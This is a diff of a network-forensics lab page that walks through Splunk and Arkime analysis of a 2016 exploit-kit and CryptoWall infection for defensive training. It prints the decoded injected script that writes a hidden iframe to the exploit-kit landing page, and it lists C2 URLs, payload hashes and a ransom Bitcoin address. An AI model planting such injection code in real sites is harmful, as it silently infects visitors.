@@ -31,7 +31,7 @@ tags:
 !!! tip "How to use this page"
     Work it in order. Each step is **Goal → Splunk query (explained line by line) → what you should see → reading the result**. Arkime appears only where Splunk cannot show a page or a body.
 
-    The result blocks were prepared from the same PCAP before you run anything. **Hosts, times, URIs and sizes should match exactly. Totals (for example the number of `conn` lines) can differ by a few** because tools split UDP and retried connections differently. If a key row is different, stop and check your case name and time range first.
+    The result blocks were prepared from the same PCAP before you run anything. **Hosts, times, URIs and sizes were checked against the pcapbox results. Totals (for example the number of `conn` lines) can differ a little** if your Zeek version splits UDP and retried connections differently. If a key row is different, stop and check your case name and time range first.
 
     Labels: **[data]** = seen in Splunk or Arkime, **[inference]** = a conclusion that still needs proof.
 
@@ -42,8 +42,8 @@ tags:
     | PC | IP / MAC / host name | What happened | Infected? |
     |---|---|---|---|
     | A | 192.168.122.132 · 48:5b:39:c1:f2:48 · **Hokaydoo-PC** | Google result → hacked `www.koeppl[.]com` → exploit kit on `*.securetopc[.]top` (Flash exploit, encrypted payload) → **CryptoWall** check-ins to hacked sites → user opened the **"Decrypt service"** ransom page | **Yes — ransomware** |
-    | B | 192.168.122.130 · 00:22:19:e2:4b:86 · **FULL-METAL-JACK** | Yahoo webmail → 6 s later a script (`MSIE 7.0` User-Agent) downloads Windows EXEs **labelled `.gif`** from 3 hacked sites, 6 times | **Yes — malware downloaded** (follow-up traffic not seen) |
-    | C | 192.168.122.52 · 00:26:55:32:a9:17 · **Jennifer-PC** | Yahoo search → `planetside.co[.]uk` with an injected script → gate `st.domandvilma[.]com` replied with an **empty** value → nothing followed | **No** — alert only |
+    | B | 192.168.122.130 · 00:22:19:e2:4b:86 · **FULL-METAL-JACK** | During a Yahoo webmail session a script (`MSIE 7.0` User-Agent, an email address inside its `id=`) downloads Windows EXEs **labelled `.gif`** from 3 hacked sites, 6 times | **Yes — malware downloaded** (follow-up traffic not seen) |
+    | C | 192.168.122.52 · 00:26:55:32:a9:17 · **Jennifer-PC** | Yahoo search → `planetside.co[.]uk` with a script injected into `mootools-core.js` → gate `st.domandvilma[.]com` replied with an **empty** value → the script set its cookie and stopped | **No** — alert only |
 
 ---
 
@@ -84,7 +84,7 @@ index=zeek pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
 
 - No `sourcetype` → every log type of this case. `sort - count` = largest first.
 
-**What you should see (order, not exact counts):** `zeek:conn`, `zeek:dns`, `zeek:http` (about 325 lines), `zeek:ssl`, `zeek:files`, `zeek:x509`, `zeek:dhcp`, `zeek:software`, possibly `zeek:weird`, `zeek:pe`.
+**What you should see (order, not exact counts):** `zeek:conn` (about 520 lines), `zeek:http` (a few hundred), `zeek:dns`, `zeek:ssl`, `zeek:files`, `zeek:x509`, `zeek:dhcp`, `zeek:software`, possibly `zeek:weird`, `zeek:pe`.
 
 **[data] Reading:**
 
@@ -106,7 +106,7 @@ index=zeek sourcetype=zeek:conn pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
 - Line 3: minutes, one decimal. **Must come before line 4** — after line 4 `first`/`last` are text and cannot be subtracted.
 - Line 4: epoch → readable date.
 
-**What you should see:** `first` **2016-01-07 22:05:47**, `last` about **22:17** (the last connection **start**; the last packet is 22:17:18), about **11.5 minutes**, roughly 470 connections.
+**What you should see:** `first` **2016-01-07 22:05:47**, `last` about **22:17** (the last connection **start**; the last packet is 22:17:18), about **11.5 minutes**, about **520** connections.
 
 ### 1-3. Which internal IPs start connections { #internal-hosts }
 
@@ -121,14 +121,14 @@ index=zeek sourcetype=zeek:conn pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS i
 - `id_orig_h=192.168.0.0/16` — Splunk understands an IP range (CIDR) on IP fields: only private 192.168.x.x senders.
 - `dc()` = distinct count. `orig_bytes` / `resp_bytes` = payload bytes each side sent.
 
-**What you should see (counts approximate):**
+**What you should see (shape; your counts will differ a little):**
 
 ```text
 id_orig_h         sessions  destinations  first
-192.168.122.130   ~130      ~30           22:05:51
-192.168.122.52    ~220      ~25           22:06:06
-192.168.122.132   ~120      ~25           22:06:25
-(192.168.122.1 may add a line or two for DHCP replies, or not appear at all)
+192.168.122.130   …         …             22:05:51
+192.168.122.52    (most)    …             22:06:06
+192.168.122.132   …         …             22:06:25
+192.168.122.1     a few (DHCP replies)
 ```
 
 **[data] Reading:**
@@ -154,15 +154,19 @@ index=zeek sourcetype=zeek:dhcp pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
 ```text
 t         client_addr      assigned_addr    mac                 host_name         msg_types
 22:05:47                   192.168.122.130  00:22:19:e2:4b:86   FULL-METAL-JACK   REQUEST ACK
+22:05:51                   192.168.122.130  00:22:19:e2:4b:86   FULL-METAL-JACK   REQUEST ACK
 22:05:54  192.168.122.130                   00:22:19:e2:4b:86   FULL-METAL-JACK   INFORM ACK
 22:06:02                   192.168.122.52   00:26:55:32:a9:17   Jennifer-PC       REQUEST ACK
+22:06:06                   192.168.122.52   00:26:55:32:a9:17   Jennifer-PC       REQUEST ACK
 22:06:10  192.168.122.52                    00:26:55:32:a9:17   Jennifer-PC       INFORM ACK
 22:06:21                   192.168.122.132  48:5b:39:c1:f2:48   Hokaydoo-PC       REQUEST ACK
+22:06:25                   192.168.122.132  48:5b:39:c1:f2:48   Hokaydoo-PC       REQUEST ACK
 22:06:29  192.168.122.132                   48:5b:39:c1:f2:48   Hokaydoo-PC       INFORM ACK
-...       (a second INFORM from .132 at 22:10:45 and from .130 at 22:11:53)
+22:10:45  192.168.122.132                   48:5b:39:c1:f2:48   Hokaydoo-PC       INFORM ACK
+22:11:53  192.168.122.130                   00:22:19:e2:4b:86   FULL-METAL-JACK   INFORM ACK
 ```
 
-**[data] Reading:** three names, three MACs, three IPs. `server_addr` is **192.168.122.1**. These answer question 2 of the exercise.
+**[data] Reading:** three names, three MACs, three IPs. Each PC asked twice (REQUEST, 4 s apart) and then sent an INFORM. On INFORM rows `assigned_addr` is empty — the PC already has its IP, so it appears in `client_addr`. `server_addr` is **192.168.122.1**. These answer question 2 of the exercise.
 
 | IP | MAC | Host name |
 |---|---|---|
@@ -195,11 +199,11 @@ id_orig_h        user_agent                                                     
 192.168.122.130  Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)            22:07:00  1      1
 192.168.122.130  Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; ...)  22:11:53  9      3
 192.168.122.132  Microsoft NCSI                                                              22:06:33  1      1
-192.168.122.132  Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko        22:10:08  81     9
+192.168.122.132  Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko        22:10:08  ~80    9
 192.168.122.132  Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR ...; rv:11.0) like Gecko  22:10:26  1  1
 192.168.122.132  Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; ...)  22:10:47  4      2
 192.168.122.52   Microsoft NCSI                                                              22:06:13  1      1
-192.168.122.52   Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)             22:08:49  ~190   ~15
+192.168.122.52   Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)             22:08:49  202    ~16
 ```
 
 **[data] Reading:**
@@ -246,7 +250,7 @@ index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS
 ```text
 id_orig_h        host                                     first     count  methods    received
 192.168.122.130  www.msftncsi.com                         22:05:58  1      GET
-192.168.122.130  mail.yahoo.com                           22:07:00  1      GET
+192.168.122.130  mail.yahoo.com                           22:07:00  1      GET        (then HTTPS — Step 4)
 192.168.122.130  ma-wt.com.sa                             22:11:53  3      GET        375301
 192.168.122.130  dariostoka.com                           22:11:55  3      GET        375301
 192.168.122.130  freshanointingministries-sc.org          22:11:57  3      GET        406541
@@ -313,41 +317,50 @@ index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS i
 | search NOT host IN ("*google*","*twimg.com","*doubleclick.net","*googlecode.com") NOT uri="*.css*" NOT uri="*.png*" NOT uri="*.jpg*" NOT uri="*.gif*" NOT uri="*.js*"
 | eval t=strftime(ts,"%H:%M:%S.%3N")
 | sort ts
-| table t host uri referrer status_code resp_mime_types response_body_len
+| table t host uri referrer user_agent status_code resp_mime_types response_body_len
 ```
 
 - `ts>=1452204600` = from **22:10:00 UTC** (epoch seconds; `| makeresults | eval x=strftime(1452204600,"%H:%M:%S")` shows it).
-- `host IN ("*google*", …)` — `IN` with wildcards; with `NOT` it hides the noise (also the Google result click at 22:10:08, `www.google.com.au/url?…url=http%3A%2F%2Fwww.koeppl.com%2F`, which you saw in 2-1). The `uri` filters hide images, styles and scripts of the normal site.
+- `host IN ("*google*", …)` — `IN` with wildcards; with `NOT` it hides the noise (also the Google result click at 22:10:08). The `uri` filters hide images, styles and scripts of the normal site.
 - `resp_mime_types` = Zeek's guess **from the content**, not from the server's label.
 
 **What you should see:**
 
 ```text
-t              host                         uri                                                        referrer                                              status  resp_mime_types              response_body_len
-22:10:10.863   www.koeppl.com               /                                                          http://www.google.com.au/url?sa=t&rct=j…            200     text/html                    62939
-22:10:15.930   uacltr.securetopc.top        /1993/10/14/madness/willow/dick-sort-southward-swallow.html http://www.koeppl.com/                               200     text/html                    1035
-22:10:16.598   uacltr.securetopc.top        /1987/09/28/behave/cheerful-stumble-broad.html.swf         http://uacltr.securetopc.top/1993/10/14/…            -       -                            0
-22:10:17.300   uacltr.securetopc.top        /1987/09/28/behave/cheerful-stumble-broad.html.swf         http://uacltr.securetopc.top/1993/10/14/…            200     application/x-shockwave-flash 83229
-22:10:23.164   gbesbsdsb.securetopc.top     /surprise/1430317/fellow-touch-death-curl-cast-dance-bubble-moonlight-shock   http://uacltr.securetopc.top/1993/10/14/…   200     -       0
-22:10:26.229   gbesbsdsb.securetopc.top     /officer/1277929/tidings-humble-communication              -                                                     200     -  (or application/octet-stream)  421888
-22:10:47.545   bizsouls.com                 /XG3vxT.php?y=21657wkalasvbb                               -                                                     200     text/plain                   14
-22:10:51.876   bizsouls.com                 /XG3vxT.php?c=a2py731nhw                                   -                                                     200     text/plain                   123668
-22:11:11.746   bizsouls.com                 /XG3vxT.php?o=py8nr3ezh06q03o                              -                                                     200     -                            0
-22:12:14.456   estudiobarco.com.ar          /5TFv7E.php?z=py8nr3ezh06q03o                              -                                                     200     text/plain                   6
-22:16:46.032   3wzn5p2yiumh7akj.waytopaytosystem.com   /1f96s0p                                        -                                                     200     text/html                    3289
-22:16:49.853   3wzn5p2yiumh7akj.waytopaytosystem.com   /picture.php?k=1f96s0p&2fb0d914316c5ee97f49d0a673412155   http://3wzn5p2yiumh7akj…/1f96s0p          200     image/…
-22:16:57.894   3wzn5p2yiumh7akj.waytopaytosystem.com   /1f96s0p   (POST)                               http://3wzn5p2yiumh7akj…/1f96s0p                     200     text/html                    14463
+t              host                                    uri                                                          referrer                                   status  resp_mime_types                response_body_len
+22:10:10.863   www.koeppl.com                          /                                                            http://www.google.com.au/url?sa=t&rct=j…  200     text/plain                     62939
+22:10:15.930   uacltr.securetopc.top                   /1993/10/14/madness/willow/dick-sort-southward-swallow.html  http://www.koeppl.com/                     200     text/html                      1035
+22:10:16.598   uacltr.securetopc.top                   /1987/09/28/behave/cheerful-stumble-broad.html.swf           http://uacltr.securetopc.top/1993/10/14/…  -       -                              0
+22:10:17.300   uacltr.securetopc.top                   /1987/09/28/behave/cheerful-stumble-broad.html.swf           http://uacltr.securetopc.top/1993/10/14/…  200     application/x-shockwave-flash  83229
+22:10:23.164   gbesbsdsb.securetopc.top                /surprise/1430317/fellow-touch-death-curl-cast-dance-bubble-moonlight-shock  http://uacltr.securetopc.top/…  200  -       0
+22:10:26.229   gbesbsdsb.securetopc.top                /officer/1277929/tidings-humble-communication                -                                          200     -                              421888
+22:10:47.545   bizsouls.com                            /XG3vxT.php?y=21657wkalasvbb                                 -                                          200     text/plain                     14
+22:10:51.876   bizsouls.com                            /XG3vxT.php?c=a2py731nhw                                     -                                          200     text/plain                     123668
+22:11:11.746   bizsouls.com                            /XG3vxT.php?o=py8nr3ezh06q03o                                -                                          200     -                              0
+22:12:14.456   estudiobarco.com.ar                     /5TFv7E.php?z=py8nr3ezh06q03o                                -                                          200     text/plain                     6
+22:16:46.032   3wzn5p2yiumh7akj.waytopaytosystem.com   /1f96s0p                                                     -                                          200     text/html                      3289
+22:16:57.894   3wzn5p2yiumh7akj.waytopaytosystem.com   /1f96s0p   (POST)                                            http://3wzn5p2yiumh7akj…/1f96s0p           200     text/html                      14463
 ```
+
+!!! note "Why is the koeppl home page `text/plain`?"
+    Zeek decides the type from the **first bytes**. A normal page starts with `<!DOCTYPE html>` or `<html>`. This one starts with `<style>` (the injected code in 3-2), so Zeek did not recognise it as HTML. The odd type is already a small clue.
 
 **[data] Reading, line by line:**
 
 1. **22:10:08–10 — the user clicked a Google result** for `www.koeppl.com` (a German motor-equipment shop). A normal visit, Referer = Google.
-2. **22:10:15 — the koeppl page called a stranger.** `uacltr.securetopc.top` has **Referer `http://www.koeppl.com/`**: something inside the koeppl page sent the browser there. **[inference]** The site is **compromised** (3-2 proves it).
-3. **The path looks like a blog post made of random words and a date** (`/1993/10/14/madness/willow/…html`). Random words in paths, a cheap `.top` domain and two random sub-domains on one IP are typical of **exploit kit (EK)** landing pages in late 2015 / early 2016.
+2. **22:10:15 — the koeppl page called a stranger.** `uacltr.securetopc.top` has **Referer `http://www.koeppl.com/`**: something inside the koeppl page sent the browser there.
+3. **The path looks like a blog post made of a date and random words** (`/1993/10/14/madness/willow/…html`). Random words in paths, a cheap `.top` domain and two random sub-domains on one IP are typical of **exploit kit (EK)** landing pages in late 2015 / early 2016.
 4. **22:10:16–17 — a Flash file (`.swf`, 83 KB)** loaded by the landing page. The first request got no answer, the browser asked again. EKs used Flash bugs to run code just by viewing a page.
-5. **22:10:26 — 421,888 bytes with no Referer and a different User-Agent** (candidate 1). Not the browser: **the exploit's own code** downloading its payload. Zeek finds **no file type** in it — the payload is **encrypted** on the wire (it is decrypted on the PC), so it does not start with `MZ`.
-6. **22:10:47 — 21 s later, a new program (`MSIE 7.0`, candidate 2) POSTs to `bizsouls.com`** three times, then to `estudiobarco.com.ar`. Random `.php` names with one-letter parameters, short replies of **hex text** — a malware **check-in to hacked websites** used as C2 relays.
-7. **22:16:46 — a page on `…waytopaytosystem.com`**, opened by the browser (IE 11 User-Agent): the user typed or clicked an address from somewhere on the PC. Step 3-4 shows what it is.
+5. **22:10:26 — 421,888 bytes with no Referer and a different User-Agent** (candidate 1). Not the browser: **the exploit's own code** downloading its payload. Zeek finds **no file type** in it (3-3).
+6. **22:10:47 — 21 s later, a new program (`MSIE 7.0`, candidate 2) POSTs to `bizsouls.com`** three times, then to `estudiobarco.com.ar` (3-4).
+7. **22:16:46 — a page on `…waytopaytosystem.com`**, opened by the browser (IE 11 User-Agent) with **no Referer** (3-5).
+
+!!! question "Question: how do we know the user did not click the exploit kit link?"
+    **The Referer alone cannot tell.** A click on a link and an automatic request from a script both send `Referer: http://www.koeppl.com/`. Three other facts answer it:
+
+    1. **The decoded script writes a hidden iframe** (3-2). The iframe address is exactly the landing URL requested at 22:10:15. A browser loads an iframe by itself — no click needed.
+    2. **The koeppl page stayed open.** The browser asked koeppl for its `favicon.ico` at 22:10:34. If the user had clicked a link, the browser would have left koeppl.
+    3. **The script ran in the browser.** The two cookies the script writes appear in the next requests to koeppl, and the server never sent them (3-2).
 
 !!! question "Question: what does the DHCP INFORM at 22:10:45 mean?"
     Look back at 1-4: .132 sent a DHCP INFORM at **22:10:45** — **2 s before** the first `MSIE 7.0` POST (22:10:47). A freshly started program asking Windows for network settings fits a new process starting. It supports, but does not prove, that the payload ran.
@@ -357,8 +370,11 @@ t              host                         uri                                 
 Zeek keeps summaries, **not page contents**. Open the koeppl page in Arkime:
 
 ```text
-tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.132 && host.http == www.koeppl.com && http.uri == "/"
+tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.132 && http.uri == "www.koeppl.com/"
 ```
+
+!!! warning "Arkime's `http.uri` includes the host name"
+    Arkime stores the URI as **host + path**, for example `www.koeppl.com/`. So `http.uri == "/"` finds **nothing**. Use the full value in quotes, or start with a wildcard: `http.uri == */counter/*`.
 
 Expand the session (`+`), choose **natural** and **uncompress**, scroll to the **response body** (it is gzip-compressed on the wire).
 
@@ -376,13 +392,44 @@ var scestqiccnik=(75811078+892246232<544535642+1517287702?"\x72\x65":"px");
 
 **[data] Reading:**
 
-- A real web page starts with `<!DOCTYPE html>` or `<html>`. Here **~25 KB of junk comes first**: a `<style>` that moves a `<div>` far off the screen (`top:-1357px`) and a `<div>` full of nonsense letters.
-- Then a `<script>` that builds words from tiny pieces (`"re"+"turn Str"+"ing"` …) — **obfuscation**, so that the word "securetopc" never appears in plain text.
-- The script reads the hidden letters and turns them into the landing-page address. **[data]** This is why the browser went to `uacltr.securetopc.top` with Referer `koeppl.com`.
+- A real web page starts with `<!DOCTYPE html>` or `<html>`. Here **about 25 KB of junk comes first**: a `<style>` that moves a `<div>` far off the screen (`top:-1357px`) and a `<div>` full of nonsense letters.
+- Then a `<script>` that builds words from tiny pieces with true/false tests (`563738144>878824873 ? "e" : "re"`) — **obfuscation**, so that the word "securetopc" never appears in plain text.
+- **Code before `<html>` on a normal site = injected.** The site is compromised.
 
-You do not need to decode it: the next request (Referer = koeppl, 5 s later) already shows where it went. **Code before `<html>` on a normal site = injected.**
+??? info "Going further: what the script does (decoded offline — never run it)"
+    The script is decoded **by reading it**, not by running it in a browser:
 
-### 3-3. Exploit kit and payload — files (Splunk) { #pc-a-files }
+    1. Each `(A>B ? "x" : "y")` piece is worked out by hand or in a small script that only compares numbers. Put together, the pieces spell `[][constructor][constructor](code)()` = `Function(code)()` — "run this text as code".
+    2. It checks the browser: `rv:11` (IE 11) or `MSIE`. Other browsers get nothing.
+    3. It reads the hidden `<div>` letters **in pairs** (`a`–`z` only). Each pair is a number: first letter × 26 + second letter. Each number is XOR-ed with the key `senP7ICzRjcg5` and turned into a character.
+
+    The result:
+
+    ```text
+    var date = new Date(new Date().getTime() + 60*60*24*7*1000);
+    document.cookie = "PHP_SESSION_PHP=120; path=/; expires="+date.toUTCString();
+    document.cookie = "_PHP_SESSION_PHP=123; path=/; expires="+date.toUTCString();
+    document.write('<style>.ecwrjvwhyzyjnx{position:absolute;top:-605px;width:300px;height:300px;}</style>
+      <div class="ecwrjvwhyzyjnx"><iframe src="http://uacltr.securetopc.top/1993/10/14/madness/willow/dick-sort-southward-swallow.html"
+      width="250" height="250"></iframe></div>');
+    ```
+
+    - **A 250×250 iframe placed 605 px above the top of the page** — invisible to the user, loaded by the browser automatically.
+    - The iframe address is **exactly** the landing URL of 22:10:15.
+    - Two cookies valid for 7 days (`PHP_SESSION_PHP=120`, `_PHP_SESSION_PHP=123`) — **[inference]** a mark so the same visitor is not attacked twice.
+
+**Proof that the script ran — the cookies (Arkime):** open the next koeppl requests and look at the `Cookie:` line.
+
+```text
+22:10:10.863  GET /                                              (no Cookie)
+22:10:13.326  GET /cache/template/gzip.php?widgetkit-…css        Cookie: PHP_SESSION_PHP=120; _PHP_SESSION_PHP=123
+22:10:14.120  GET /cache/template/gzip.php?bootstrap-…css        Cookie: PHP_SESSION_PHP=120; _PHP_SESSION_PHP=123
+```
+
+- **[data]** No server response in the capture contains `Set-Cookie: PHP_SESSION_PHP`. The cookies were **made inside the browser**, by the injected script.
+- Method to remember: **decide what the code must leave behind if it ran, then look for that trace in the next requests.** Step 5 uses the same method.
+
+### 3-3. Exploit kit and payload — files (Splunk + Arkime) { #pc-a-files }
 
 ```spl
 index=zeek sourcetype=zeek:files pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS tx_hosts="89.38.144.75"
@@ -398,165 +445,242 @@ index=zeek sourcetype=zeek:files pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS 
 ```text
 t         tx_hosts      rx_hosts         mime_type                       seen_bytes  md5
 22:10:15  89.38.144.75  192.168.122.132  text/html                       1035        946f2af6be0d796430b590ad5ee48be5
-22:10:17  89.38.144.75  192.168.122.132  application/x-shockwave-flash   83229       6631e8c0d5f07004fabff81872f10d5e
-22:10:26  89.38.144.75  192.168.122.132  (empty)                         421888      dd5ecd6f928fc4f988996feb5b292879
+22:10:18  89.38.144.75  192.168.122.132  application/x-shockwave-flash   83229       6631e8c0d5f07004fabff81872f10d5e
+22:10:27  89.38.144.75  192.168.122.132  (empty)                         421888      dd5ecd6f928fc4f988996feb5b292879
 ```
 
-**[data] Reading:** Flash exploit → encrypted payload (no type, ~412 KB). The MD5 of the payload is of the **encrypted** bytes, not of the program on disk — searching it in a malware database usually finds nothing.
+Now open the payload in Arkime:
 
-**[inference] Which exploit kit?** Random date-and-words paths, `.html.swf` names, a `.top` domain with two random sub-domains, a payload path of a word + number + words and an encrypted payload match how **Neutrino EK** looked in January 2016. The original exercise identified the EK from IDS alerts, which you do not have here — write "EK (pattern matches Neutrino)", not a confirmed name.
+```text
+tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.132 && http.uri == */officer/*
+```
 
-### 3-4. After the payload: check-ins and a ransom page { #pc-a-post }
+**[data] Reading:**
 
-**Check-ins (Splunk):**
+- The request has **no Referer**, a **different User-Agent** (IE 11 with extra `.NET CLR` parts) and very few headers — a program, not the browser page.
+- The reply says `Content-Type: application/octet-stream`. The body starts with `26 2e c8 75 …`, **not `MZ`**. The payload is **encrypted** on the wire and decrypted on the PC.
+- So the MD5 is of the **encrypted** bytes, not of the program on disk. Searching it in a malware database usually finds nothing.
+
+**[inference] Which exploit kit?** Random date-and-words paths, `.html.swf` names, a `.top` domain with two random sub-domains, a payload path of a word + number + words and an encrypted payload match how **Neutrino EK** looked in January 2016. Write "EK (pattern matches Neutrino)", not a confirmed name.
+
+### 3-4. After the payload: check-ins (Splunk + Arkime) { #pc-a-post }
 
 ```spl
-index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.132 method=POST
+index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.132 method=POST host IN ("bizsouls.com","estudiobarco.com.ar")
 | eval host=mvdedup(host)
 | eval t=strftime(ts,"%H:%M:%S")
-| table t id_resp_h host uri user_agent request_body_len response_body_len
+| table t id_orig_p id_resp_h host uri request_body_len response_body_len
 ```
 
 ```text
-t         id_resp_h        host                                   uri                             request_body_len  response_body_len
-22:10:47  188.138.101.154  bizsouls.com                           /XG3vxT.php?y=21657wkalasvbb    131               14
-22:10:51  188.138.101.154  bizsouls.com                           /XG3vxT.php?c=a2py731nhw        113               123668
-22:11:11  188.138.101.154  bizsouls.com                           /XG3vxT.php?o=py8nr3ezh06q03o   124               0
-22:12:14  50.22.11.55      estudiobarco.com.ar                    /5TFv7E.php?z=py8nr3ezh06q03o   124               6
-22:16:57  95.128.181.144   3wzn5p2yiumh7akj.waytopaytosystem.com  /1f96s0p                        (captcha form)    14463
+t         id_orig_p  id_resp_h        host                 uri                             request_body_len  response_body_len
+22:10:47  49218      188.138.101.154  bizsouls.com         /XG3vxT.php?y=21657wkalasvbb    131               14
+22:10:51  49219      188.138.101.154  bizsouls.com         /XG3vxT.php?c=a2py731nhw        113               123668
+22:11:11  49220      188.138.101.154  bizsouls.com         /XG3vxT.php?o=py8nr3ezh06q03o   124               0
+22:12:14  …          50.22.11.55      estudiobarco.com.ar  /5TFv7E.php?z=py8nr3ezh06q03o   124               6
 ```
 
-In Arkime the bodies look like this:
+Open the four POSTs in Arkime:
+
+```text
+tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.132 && host.http == [bizsouls.com, estudiobarco.com.ar]
+```
 
 ```text
 POST /XG3vxT.php?y=21657wkalasvbb HTTP/1.1
+Accept: */*
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; ...)
 Host: bizsouls.com
+Content-Length: 131
+Connection: Close
+Cache-Control: no-cache
 
 b=31793872756d7071786e3391b3073aac2a423df8a3b5afb9cb38c907fba895a77d264b81ad...
 ```
 
-**[data] Reading:** one letter `=` long hex, and the reply is hex too (`39187820a48aa9`; the second reply is **124 KB of hex**). Encrypted C2. The last two POSTs (`o=` to bizsouls and estudiobarco) carry **the same body** — the program tried a second relay with the same message.
+**[data] Reading:**
 
-**The page on `waytopaytosystem.com` (Arkime):**
+- **Not the browser:** no `Accept-Language`, no `Accept-Encoding`, no Referer; `Connection: Close` and a **new connection for every POST** (source ports 49218, 49219, 49220).
+- Body = **one letter `=` hex**, reply = hex too (`39187820a48aa9`; the second reply is **123,668 bytes of hex**). Hex that does not turn into readable bytes, not even with a 1-byte XOR → **[inference] real encryption**. Stop decoding here.
+- The parameter letter changes (`y`, `c`, `o`, `z`) but values repeat. Path names (`XG3vxT.php`) and the shared-hosting `Server:` header fit **hacked websites used as relays**.
+
+**Why compare the last two bodies?** bizsouls answered the third POST (22:11:11) with **0 bytes**. One minute later the same kind of POST went to estudiobarco. If the bodies are **the same**:
+
+1. The program **retried the same message on a second server** → it carries a **list of C2 servers**. Blocking one is not enough.
+2. Both sites belong to **one infection** — two IOCs in one ticket.
+3. The encryption gives the same output for the same input, so the hex value itself can be an indicator.
+
+**How to compare without reading:** Arkime's **Body MD5s** (HTTP panel) hash **request and response bodies**. The third bizsouls session shows `4fd5e80b20ea9d39925155d9f8b2aa1d` (its reply is empty, so that is the request body). The estudiobarco session shows `eb74f3bb…` (its reply) **and `4fd5e80b20ea9d39925155d9f8b2aa1d`**. **[data] Same body** (`o=79386f37…eacb6`, 124 bytes), and the URI value `py8nr3ezh06q03o` is the same too.
+
+### 3-5. The page the user opened (Arkime) { #pc-a-ransom }
+
+**Why look at it?** The payload and the check-ins are encrypted. We know PC A is infected, but **not by what, or what the damage is**. This page was made for a human, so it is plain text. It answers four questions: what malware, what damage, is it really this PC, did the user see it.
 
 ```text
 tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && host.http == 3wzn5p2yiumh7akj.waytopaytosystem.com
 ```
 
-Open the session with the **POST `/1f96s0p`** (14,463-byte reply), natural + uncompress. The text reads (shortened):
+!!! warning "An Arkime session is one TCP connection, not one request"
+    You get **7 sessions**, but none is "the GET at 22:16:46". The browser keeps a connection open (keep-alive) and sends several requests on it. The **Start Time** is when the connection opened, not when a request was sent. Find a request by its **source port**:
+
+    | Request | Request time | Session (Src Port) |
+    |---|---|---|
+    | `GET /1f96s0p` | 22:16:46.032 | **49222** (Start 22:16:45) |
+    | `GET /picture.php?k=1f96s0p&…` | 22:16:49.853 | **49228** |
+    | `POST /1f96s0p` | 22:16:57.894 | **49226** (Start 22:16:48) |
+
+    The URI list in the Info column is **not in time order** either.
+
+Open both sessions with **natural** and **uncompress** (the pages are gzip and chunked).
+
+**① Session 49222 — the first GET:**
 
 ```text
 <title>Decrypt service</title>
-Your files are encrypted. To get the key to decrypt files you have to pay 500 USD.
-If payment is not made before 14/01/16 - 16:16 the cost of decrypting files will increase 2 times ...
-Your system: Windows 7 ( x64 )   First connect IP: 103.12.9.206
-We are present a special software - CryptoWall Decrypter - ...
-Send BTC to Bitcoin address: ...   1.14 BTC ~= 500 USD
+Service to decrypt the files.
+To continue please enter the code from the picture in the input field.
+<img src="picture.php?k=1f96s0p&2fb0d914316c5ee97f49d0a673412155">
+Code of picture: [5 characters]   [Enter to decrypt service]
 ```
 
-**[data] This is a CryptoWall ransom payment page**, reached through a Tor gateway (`tor2web-header` in the page code). The first GET showed a captcha ("enter the code from the picture" — `picture.php`), the POST sent the code, and the reply is the payment page. **The user saw a ransom note on their PC and followed its instructions.**
+- A **captcha** page with language flags (US, IT, FR, ES, DE) — the many `flags/*.png` requests.
+- The script hides an element called `tor2web-header`. **[inference]** tor2web lets a normal browser reach a Tor hidden service; `3wzn5p2yiumh7akj` has the 16 characters of a 2016 `.onion` name. The real server is inside Tor — blocking this IP does not stop it.
+
+**② Session 49226 — the POST (scroll past `es.png`, `rb.png`, `favicon.ico`):**
+
+```text
+POST /1f96s0p HTTP/1.1
+Content-Length: 14
+
+pic_code=T7z5W
+```
+
+```text
+Your files are encrypted.
+To get the key to decrypt files you have to pay 500 USD. If payment is not made before 14/01/16 - 16:16
+the cost of decrypting files will increase 2 times and will be 1000 USD/EUR
+Your system: Windows 7 (x64)   First connect IP: 103.12.9.206  [AU flag]
+We are present a special software - CryptoWall Decrypter - ...
+Send 1.14 BTC to Bitcoin address: 16VXHKKtwGx8YG9qaEqszCLscUxtm326LZ
+Your payments not found.
+```
+
+The page script starts `back_timer('back_timer', 604800)` — 604,800 s = **7 days**.
+
+**[data] Answers:**
+
+| Question | Answer |
+|---|---|
+| What malware? | **CryptoWall** — the page names "CryptoWall Decrypter" |
+| What damage? | **Files encrypted**, 500 USD (1.14 BTC), doubles after 7 days. No payment yet ("Your payments not found") |
+| This PC? | "Windows 7 (x64)" matches the User-Agent `Windows NT 6.1; WOW64`. **[inference]** `103.12.9.206` is the network's public (NAT) IP, recorded at the first check-in; the AU flag fits a PC that uses `google.com.au` |
+| Did the user see it? | **Yes.** The user typed the captcha (`pic_code=T7z5W`). The visit had no Referer: **[inference]** the address came from the ransom note on the PC |
+
